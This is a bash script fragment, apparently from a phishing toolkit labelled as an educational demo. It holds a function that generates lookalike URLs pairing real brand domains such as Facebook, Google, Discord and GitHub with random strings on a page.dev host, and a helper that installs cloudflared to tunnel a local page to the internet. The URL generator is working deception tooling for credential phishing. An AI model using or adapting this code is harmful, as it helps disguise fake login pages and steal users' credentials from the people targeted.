# Generate a convincing phishing-style URL for educational demo
# Format: sitename.com-[long random alphanumeric]
generate_phish_url() {
    local site="$1"
    # Map site names to realistic domain bases
    case "${site,,}" in
        facebook)  local base="facebook.com" ;;
        instagram) local base="instagram.com" ;;
        discord)   local base="discord.com" ;;
        google)    local base="google.com" ;;
        github)    local base="github.com" ;;
        gitlab)    local base="gitlab.com" ;;
        dropbox)   local base="dropbox.com" ;;
        adobe)     local base="adobe.com" ;;
        ebay)      local base="ebay.com" ;;
        badoo)     local base="badoo.com" ;;
        deviantart)local base="deviantart.com" ;;
        *)         local base="${site}.com" ;;
    esac
    # Generate long random alphanumeric suffix — 60 chars + 40 chars with dot separator
    local chars="abcdefghijklmnopqrstuvwxyz0123456789"
    local rand1="" rand2=""
    for i in $(seq 1 48); do
        rand1+="${chars:RANDOM%${#chars}:1}"
    done
    for i in $(seq 1 16); do
        rand2+="${chars:RANDOM%${#chars}:1}"
    done
    # Format: sitename.com-[48chars].[16chars].page.dev
    echo "${base}-${rand1}.${rand2}.page.dev"
}

check_cloudflared() {
    if command -v cloudflared &>/dev/null; then
        return 0
    fi
    return 1
}

install_cloudflared() {
    echo -e "  ${CYAN}[i]${RESET} Installing cloudflared..."
    local arch
    arch=$(uname -m)
    local url
    case "$arch" in
        x86_64)  url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        aarch64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        armv7l)  url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        *)       echo -e "  ${RED}[!]${RESET} Unsupported architecture: $arch"; return 1 ;;
    esac
    if curl -L "$url" -o /tmp/cloudflared --progress-bar; then
        chmod +x /tmp/cloudflared
        sudo mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null || mv /tmp/cloudflared "${BASE_DIR}/cloudflared"
        echo -e "  ${GREEN}[+]${RESET} cloudflared installed successfully."
        return 0
    else
        echo -e "  ${RED}[!]${RESET} Failed to download cloudflared."
        return 1
    fi
}

